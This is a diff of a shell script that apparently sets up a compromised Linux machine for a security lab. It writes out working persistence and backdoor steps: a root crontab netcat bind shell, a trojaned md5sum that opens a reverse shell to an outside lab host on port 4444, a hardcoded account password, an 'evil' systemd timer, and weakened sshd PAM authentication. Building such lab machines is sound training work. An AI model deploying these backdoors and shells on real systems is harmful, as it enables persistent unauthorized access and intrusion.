@@ -10,12 +10,12 @@ echo "very_important_account:IAMAHACKER" | chpasswd
 echo "*/1 * * * * root /usr/bin/nc -e /bin/bash -l 666 &" >> /etc/crontab
 
 # create a reverse shell in the md5sum command (4)
-cat > /usr/local/sbin/md5sum <<- EOM
+cat > /usr/local/bin/md5sum <<- EOM
 #!/bin/bash
-(nc -e /bin/bash $(dig +short web1.umcstlab.net) 4444 ) &>/dev/null &
+(nc -e /bin/bash $(dig +short web0.linux.spicelab.org) 4444 ) &>/dev/null &
 /usr/bin/md5sum \$1
 EOM
-chmod +x /usr/local/sbin/md5sum
+chmod +x /usr/local/bin/md5sum
 
 # create evil systemD timer (5)
 cat > /etc/systemd/system/cleanup.service <<- EOM
@@ -55,7 +55,7 @@ usermod -a -G wheel ftp
 if [ -s /usr/lib64/security/pam_extra.so ]
 then
   sed -i '2 s/required/sufficient/' /etc/pam.d/sshd
-  sed -i "2 a auth      sufficient    pam_extra.so  $(dig +short web_0)" /etc/pam.d/sshd
+  sed -i "2 a auth      sufficient    pam_extra.so  $(dig +short web0.linux.spicelab.org)" /etc/pam.d/sshd
 fi
 
 # break the web server
